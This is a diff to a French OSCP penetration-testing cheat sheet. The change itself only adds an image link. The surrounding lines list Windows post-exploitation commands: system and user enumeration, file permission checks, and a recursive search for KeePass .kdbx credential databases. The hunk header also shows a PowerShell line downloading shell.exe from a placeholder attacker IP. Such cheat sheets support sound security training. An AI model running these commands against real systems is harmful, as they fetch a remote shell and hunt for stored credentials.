@@ -9,6 +9,8 @@ Ou alors: (new-object System.Net.WebClient).DownloadFile('http://[IP]/shell.exe'
 **Information systeme:** systeminfo  
 **Lister les infos d'un user:** net user [user]  
 **Lister quel groupe / user ont accès au fichier:** icacls [fichier]  
+![image](https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/8a6e9321-9713-4e5f-95c7-f60cb03a49c4)  
+
 **Lister process:** Get-Process | ForEach-Object {$_.Path}  
 **Trouver des fichiers (équivalent find):** Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
